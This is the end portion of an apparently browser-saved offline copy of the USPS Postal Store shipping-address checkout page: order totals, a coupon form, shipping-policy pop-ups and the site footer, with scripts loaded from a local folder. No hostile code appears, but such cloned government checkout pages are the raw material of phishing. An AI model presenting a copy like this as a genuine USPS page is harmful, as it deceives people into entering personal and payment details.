			<div class="button-container">
				<input role="button" name="/atg/commerce/order/purchase/ShippingGroupFormHandler.cancel" type="submit" class="btn-primary cancel-address-btn" value="Cancel"><input name="_D:/atg/commerce/order/purchase/ShippingGroupFormHandler.cancel" type="hidden" value=" ">
			</div>
		</div>
	</div>
	</div>	
	</div>
</div>
	</form>		
			
				
				
				
			

















  










  
    
  
  





  
  





  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
	  
	  
	
	  
	    
	    
	  
	    
	    
	      
	      
	      
	      
	      
	    
	  
	  
	    
    





 












 
   
    
    
     
    
 
 
 
 
  
  
    
      
    
  
  
  

    
      
      
    
      
      
        
        
        
        
        
        
        
      
    




  
    
    
      
        
        
      
    
    
  
  
  <div class="col-12 col-md-4 order-summary shopping-cart d-flex flex-column">
    
    <div class="row gray-box">  	
      <h2 class="col-12 sub-header">Order Summary</h2>
      
     

            
            
			  
              <div class="d-flex flex-row justify-content-between sub-total">
              	
                   
                   
                      <span class="total-price-label">Subtotal:</span>
                   
                
				<span class="total-price-value">
		         
				    
				     
				    
			              
				    
		         
	              
                    
                  

















  










  
    
  
  





  
  




  
  
  
  
  
	

  
  
    
  
  
  
  
  
    
    
  
    
    
      
      
      
      
      
        
        
        
        
        
        
        
        
        
          
            
          
          
        
        
      
      
      
        
        
          $0.00
          
        
      

     
    
  



                </span>
              </div>
            

             
            

            
            
              
              
              
              
            

            
			
			  
					
					  
						
							<div>
								<p class="shipping-handling">
									
										
										
											Shipping &amp; Handling calculated after shipping address selected
										
									
								</p>
							</div>
					 	
					 	
					 	
							
							
								
									
									
										<div class="d-flex flex-row justify-content-between shipping-info-item shipping-handling">
											<span class="shipping-type">Shipping:</span>
											<span class="shipping-price">
												
													
														
													
													
												
										  	

















  










  
    
  
  





  
  




  
  
  
  
  
	

  
  
    
  
  
  
  
  
    
    
  
    
    
      
      
      
      
      
        
        
        
        
        
        
        
        
        
          
            
          
          
        
        
      
      
      
        
        
          $1.99
          
        
      

     
    
  


</span>
										</div>
										
											<div class="d-flex flex-row justify-content-between shipping-info-item shipping-handling">
												<span class="handling-label">Handling:</span>
												<span class="handling-price">
													
														
														
															
															
																
															
														
									  				

















  










  
    
  
  





  
  




  
  
  
  
  
	

  
  
    
  
  
  
  
  
    
    
  
    
    
      
      
      
      
      
        
        
        
        
        
        
        
        
        
          
            
          
          
        
        
      
      
      
        
        
          $0.00
          
        
      

     
    
  



									  			</span>
											</div>
										
									
								
							
						
					  
					  
					
			   
            
			
            
            
            
			
              
                
                
                  
                  
                   
                      <div style="display:none"><input name="_dyncharset" type="hidden" value="UTF-8"> </div><div style="display:none"><input name="_dynSessConf" type="hidden" value="281091852274572378"> </div>
                        

















  










  
    
  
  





  
  




  

  
  
  
  
  
  
  
  
  
  
  
  
  
    
		
		
	
		
		
			
		
	
  
  
  
  
    
    
      
    
    
    
    
  
  
  

  
  
  
  
  

  <div class="coupon-wrapper">
  
    
    
	  <div class="d-flex flex-row justify-content-between align-items-center">
		  <span>
			Coupon Code:
		  </span>
		  <div class="col-4 coupon-input" onkeypress="return setContactInfoAndSubmit(event)">
			
				
				
			<input autocomplete="off" dojotype="atg.store.widget.enterSubmit" targetbutton="atg_store_applyCoupon" name="/atg/store/order/purchase/CouponFormHandler.couponCode" id="atg_store_promotionCodeInput" type="text" value="" lang="en" widgetid="atg_store_promotionCodeInput"><input name="_D:/atg/store/order/purchase/CouponFormHandler.couponCode" type="hidden" value=" ">
		  </div>
	  </div>

	  <div class="apply-coupon d-flex justify-content-end">
        
        
                  
      		
        <input onclick="javascript:setContactInfo();" tabindex="0" name="/atg/store/order/purchase/CouponFormHandler.claimCoupon" id="atg_store_applyCoupon" type="submit" value="Apply Coupon" class="input-inline-link"><input name="_D:/atg/store/order/purchase/CouponFormHandler.claimCoupon" type="hidden" value=" ">
	  </div>
      
    
  
  
  </div>  
    
  <input name="/atg/store/order/purchase/CouponFormHandler.applyCouponSuccessURL" type="hidden" value="/store/checkout/shippingAddressEdit.jsp?nickName=Address&amp;selectedAddress=Address&amp;successURL=%2fstore%2fcheckout%2fshipping.jsp"><input name="_D:/atg/store/order/purchase/CouponFormHandler.applyCouponSuccessURL" type="hidden" value=" ">
  <input name="/atg/store/order/purchase/CouponFormHandler.applyCouponErrorURL" type="hidden" value="/store/checkout/shippingAddressEdit.jsp?nickName=Address&amp;selectedAddress=Address&amp;successURL=%2fstore%2fcheckout%2fshipping.jsp"><input name="_D:/atg/store/order/purchase/CouponFormHandler.applyCouponErrorURL" type="hidden" value=" ">
  <input name="/atg/store/order/purchase/CouponFormHandler.editCouponSuccessURL" type="hidden" value="/store/checkout/shippingAddressEdit.jsp?nickName=Address&amp;selectedAddress=Address&amp;successURL=%2fstore%2fcheckout%2fshipping.jsp"><input name="_D:/atg/store/order/purchase/CouponFormHandler.editCouponSuccessURL" type="hidden" value=" ">
  <input name="/atg/store/order/purchase/CouponFormHandler.editCouponErrorURL" type="hidden" value="/store/checkout/shippingAddressEdit.jsp?nickName=Address&amp;selectedAddress=Address&amp;successURL=%2fstore%2fcheckout%2fshipping.jsp"><input name="_D:/atg/store/order/purchase/CouponFormHandler.editCouponErrorURL" type="hidden" value=" ">




                      <div style="display:none"><input name="_DARGS" type="hidden" value="/store/checkout/gadgets/checkoutOrderSummary.jsp.couponform"> </div>
                   
                  
                
              
            

	
								  

            
            
              
                

















  










  
    
  
  





  
  




  

    
  
  
  
  

  
    
    
    
  
    
    
    

      
          
            
             
           
          
    
  




              
              
            


            
              
              
                
              
            
						

          
          
		  
		 
          
          
          
            <div class="d-flex flex-row justify-content-between total-cost">
              
                 
                 
                      <span class="total-price-label">Total:</span>
                 
              
              <span class="total-price-value">
	        
	  	  
		  
		  
                    
		  
	        
             
                
                
                  
                
                
	                
	                  
	                

















  










  
    
  
  





  
  




  
  
  
  
  
	

  
  
    
  
  
  
  
  
    
    
  
    
    
      
      
      
      
      
        
        
        
        
        
        
        
        
        
          
            
          
          
        
        
      
      
      
        
        
          $2.99
          
        
      

     
    
  



                
              </span>
            </div>
           
           
            
              
              
              
              
            
            
            
          
      

      
        
          
        

















  










  
    
  
  





  
  



  
  
  


      
     
    </div>
  </div>



			
		</div>	
	</div>
</div>
<!-- END Shipping Address Cart -->	
  <div style="display:none"><input name="_DARGS" type="hidden" value="/store/checkout/gadgets/shippingAddressEditMR.jsp.shippingaddresseditform"> </div>
  <div class="clear"></div>
  
  <!--  start include -->
<style type="text/css">

</style>


<script type="text/javascript" src="./files/Edit Shipping Address _ USPS_files/jquery.simplemodal.1.4.1.js.téléchargement"></script>
<script type="text/javascript" src="./files/Edit Shipping Address _ USPS_files/validations.js.téléchargement"></script>

<!--  end include -->


<div class="clear"></div>


        
        
        
        
        
        

        
      
    
  






<!-- START DEMO BUTTONS -->

<!-- END DEMO BUTTONS -->


<div class="results-return">
	<a href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#"><img src="./files/Edit Shipping Address _ USPS_files/backtop.png" alt="Back to Top" title="Back to Top"></a>
</div>

<!-- Modal -->
<div class="modal fade show" id="shipping-info-modal" role="dialog" tabindex="-1" style="display: none;" aria-modal="true">
	<div class="modal-dialog modal-lg">
		<div class="modal-content modal-container">
			<div class="modal-header">
				<a href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#" type="button" id="close" class="close" data-dismiss="modal" tabindex="0"><span class="visuallyhidden">Close Modal</span></a>
			</div>
			<div class="modal-body">
				<div class="body-content d-flex flex-column">
					<h3>Customer & Shipping Information</h3>
					<p>The Postal Store<sup>®</sup> ships all in-stock orders with USPS Tracking<sup>™</sup>. Please allow 5-7 business days for in-stock items to be shipped.<br><br>
					The Postal Store<sup>®</sup> cannot accept orders for shipment outside of the United States, but we do ship to APO/FDO/DPO addresses and U.S. territories. <a href="https://pe.usps.com/text/dmm300/608.htm#1255642">Learn More</a><br><br>
					All stamp and philatelic orders are charged at $1.30 Handling Fee on domestic orders of up to $50.00, and $1.80 if the order is greater than $50.  These fixed handling fees apply to only the portion of the order total that is stamp and philatelic products.<br><br>
					All Personalized Stamped Stationery products are charged a flat Priority Mail rate depending on how many boxes are ordered as specified in the PSE Shipping Charges table, and should be shipped within 5-7 business days.<br><br>
					All other products except free shipping supplies are charged standard Priority Mail fees based on weight of the item and shipping address ZIP Code<sup>™</sup>.<br><br>
					If your order contains pre= or back-ordered items, all in-stock products will ship within 5-7 business days and any pre- or back-ordered items will ship separately as they become available.<br><br>
					Free shipping supplies are mailed Standard Post<sup>™</sup> and are shipped within 3-5 business days.  For your convenience all orders will contain a carrier release endorsement "Leave if No Response".  This will allow your postal carrier to leave your expedited packaging supply order if you are not available to receive the delivery.<br><br>
					If your local Post Office is unable to fullfill your order of Expedited Shipping Supplies within 1-2 business days, your order will be fulfilled by our distribution center within 3-5 business days.</p>
				</div>
			</div>
		</div>
	</div>
</div>


<div class="modal fade show" id="cart-modal" role="dialog" tabindex="-1" style="display: none;" aria-modal="true">
	<div class="modal-dialog modal-md">
		<div class="modal-content modal-container">
			<div class="modal-header">
				<a href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#" type="button" id="close" class="close" data-dismiss="modal" tabindex="0"><span class="visuallyhidden">Close Modal</span></a>
			</div>
			<div class="modal-body">
				<div class="body-content d-flex flex-column">
					<h3>You have items in your cart</h3>

					<p>Attention USPS Customer,<br>You already have items in your cart.
					Premium Forwarding Residential orders can not be combined with other items at checkout. Please complete your checkout or empty your cart before creating a new Premium Forwarding Service Residential request.</p>
					<div class="col-md-12 col-sm-12 col-xs-12 button-wrapper">
					<div class="button-container">
                        <a href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#" role="button" class="btn-primary" tabindex="0">Go to Cart</a>
					</div>
					<div class="button-container">
						<a href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#" role="button" class="btn-primary button--white" tabindex="0">Continue Shopping</a>
					</div>			
				</div>
				</div>
			</div>
		</div>
	</div>
</div>

<div class="modal fade" id="delete-address-modal" role="dialog" tabindex="-1" style="display: none;">
	<div class="modal-dialog modal-md">
		<div class="modal-content modal-container">
			<div class="modal-header">
                <h3 class="modal-title">Are you sure you want to delete this address?</h3>
			</div>
			<div class="modal-body">
				<div class="body-content">
					<p>This will delete this address from your address book.</p>
				</div>
            </div>
			<div class="modal-buttons">
				<div class="button-container">
					<a href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#" type="button" class="btn-primary remove-item-button" data-dismiss="modal" tabindex="0">Yes</a>
				</div>	
				<div class="button-container">
					<a href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#" type="button" class="btn-primary button--white" data-dismiss="modal" tabindex="0">No</a>
				</div>
			</div>
		</div>
	</div>
</div>

<div id="atg_store_footer">
	<div class="footer">
		<div id="global-footer--wrap" class="global-footer--wrap">
<link type="text/css" rel="stylesheet" href="./files/Edit Shipping Address _ USPS_files/main-sb.css">
<link type="text/css" rel="stylesheet" href="./files/Edit Shipping Address _ USPS_files/footer-sb.css">
		
			<!--[if lte IE 8]>
			<link href="/global-elements/footer/css/main.ie.sb.css" rel="stylesheet" type="text/css" />
			<link href="/global-elements/footer/css/footer.ie.sb.css" rel="stylesheet" type="text/css" />
			<![endif]-->
		
		
<style>div#global-footer--wrap{width: 100%;}div#atg_store_footer{padding: 0;margin: 0;}#atg_store_footer>div{width:100%!important;}</style>
<footer class="global-footer">
<a href="https://www.usps.com/" class="global-footer--logo-link"></a>
<nav class="global-footer--navigation">
<ol>
<li style="color:#333366;" class="global-footer--navigation-category">
						Helpful Links
						<ol class="global-footer--navigation-options">
<li>
<a href="https://www.usps.com/help/contact-us.htm">Contact Us</a>
</li>
<li>
<a href="https://www.usps.com/globals/site-index.htm">Site Index</a>
</li>
<li>
<a href="https://faq.usps.com/s/">FAQs</a>
</li>
<li><a href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#" onclick="KAMPYLE_ONSITE_SDK.showForm(244)">Feedback</a></li>
</ol>
</li>
<li style="color:#333366;" class="global-footer--navigation-category">
						On About.USPS.com
						<ol class="global-footer--navigation-options">
<li>
<a href="https://about.usps.com/">About USPS Home</a>
</li>
<li>
<a href="https://about.usps.com/newsroom/">Newsroom</a>
</li>
<li>
<a href="https://about.usps.com/newsroom/service-alerts/">USPS Service Updates</a>
</li>
<li>
<a href="https://about.usps.com/resources/">Forms &amp; Publications</a>
</li>
<li>
<a href="https://about.usps.com/what/government-services/">Government Services</a>
</li>
<li>
<a href="https://about.usps.com/careers/">Careers</a>
</li>
</ol>
</li>
<li style="color:#333366;" class="global-footer--navigation-category">
						Other USPS Sites
						<ol class="global-footer--navigation-options">
<li>
<a href="https://gateway.usps.com/">Business Customer Gateway</a>
</li>
<li>
<a href="https://www.uspis.gov/">Postal Inspectors</a>
</li>
<li>
<a href="https://www.uspsoig.gov/">Inspector General</a>
</li>
<li>
<a href="https://pe.usps.com/">Postal Explorer</a>
</li>
<li>
<a href="https://postalmuseum.si.edu/">National Postal Museum</a>
</li>
<li>
<a href="https://www.usps.com/business/web-tools-apis/">Resources for Developers</a>
</li>
</ol>
</li>
<li style="color:#333366;" class="global-footer--navigation-category">
						Legal Information
						<ol class="global-footer--navigation-options">
<li>
<a href="https://about.usps.com/who/legal/privacy-policy/">Privacy Policy</a>
</li>
<li>
<a href="https://about.usps.com/who/legal/terms-of-use.htm">Terms of Use</a>
</li>
<li>
<a href="https://about.usps.com/who/legal/foia/">FOIA</a>
</li>
<li>
<a href="https://about.usps.com/who/legal/no-fear-act/">No FEAR Act EEO Data</a>
</li>
</ol>
</li>
</ol>
</nav>
		
			<div class="global-footer--copyright">Copyright © <script type="text/javascript">document.write(new Date().getFullYear());</script>2022 USPS.  All Rights Reserved.</div>
		
		
<ul class="global-footer--social">
<li>
    <a style="text-decoration: none;" href="https://www.facebook.com/USPS?rf=108501355848630">
        <img alt="Image of Facebook social media icon." src="./files/Edit Shipping Address _ USPS_files/social-facebook_1.png">
    </a>
</li>
<li>
    <a style="text-decoration: none;" href="https://twitter.com/usps">
	  <img alt="Image of Twitter social media icon." src="./files/Edit Shipping Address _ USPS_files/social-twitter_2.png">
    </a></li>
<li>
	<a style="text-decoration: none;" href="http://www.pinterest.com/uspsstamps/">
        <img alt="Image of Pinterest social media icon." src="./files/Edit Shipping Address _ USPS_files/social-pinterest_6.png">
    </a>
</li>
<li>
    <a style="text-decoration: none;" href="https://www.youtube.com/usps">
     <img alt="Image of Youtube social media icon." src="./files/Edit Shipping Address _ USPS_files/social-youtube_3.png">
    </a> 
</li>
</ul>

</footer>
</div><!--Chat Solution-->
<style type="text/css">
#uspsChatContainer1
{
    display: block;
    position: fixed;
    bottom: 0;
    right: 0;
}
</style>

<!-- Chat Specific CSS -->
<style type="text/css">

.rn_ConditionalChatLink .rn_ChatAvailable
{
    display: block;
}
/*comment*/

#uspsChatContainer1 .rn_ConditionalChatLink .rn_ChatAvailable a
{
    display: block;
    float: left;
    width: 184px;
    height: 64px;
    text-indent: -9999px;
    background: transparent url(https://uspshelp.widget.custhelp.com/euf/assets/images/chat.png) no-repeat 0 0;
}
#uspsChatContainer1 .rn_ConditionalChatLink .rn_ChatAvailable a.minimized
{
    display: block;
    float: left;
    width: 60px;
    height: 64px;
    text-indent: -9999px;
    background: transparent url(https://uspshelp.widget.custhelp.com/euf/assets/images/chat_small.png) no-repeat 0 0;
}
#uspsChatContainer1 .rn_ConditionalChatLink .rn_ChatAvailable a#minimize_chat_launch
{
    display: block;
    float: left;
    width: 32px;
    height: 64px;
    text-indent: -9999px;
    background: transparent url(https://uspshelp.widget.custhelp.com/euf/assets/images/chat_minimize.png) no-repeat 0 0;
}
#uspsChatContainer1 .rn_ConditionalChatLink .rn_ChatAvailable a#minimize_chat_launch.minimized
{
    display: none;
}

</style>
<!-- END Chat Specific CSS -->

<!-- END CHAT SOLUTION -->

<!--Proactive Chat Solution -->
<div id="rn_Container">
</div>

<div id="uspsChatContainer1">
    <div id="myChatLinkContainer">
        <div id="myChatLink">
            <div id="myChatLinkInfo">
            </div>
        </div>
    </div>
</div>
                



	</div>
</div>





<span></span><span id="kampyleButtonContainer"><button id="nebula_div_btn" style="border: none; position: fixed !important; margin-top: 0px;" alt="Feedback" tabindex="0" class="kampyle_vertical_button kampyle_right  wcagOutline "><div class="kampyle_button"></div><div data-aut="feedback" class="kampyle_button-text">Feedback</div></button></span></body></html>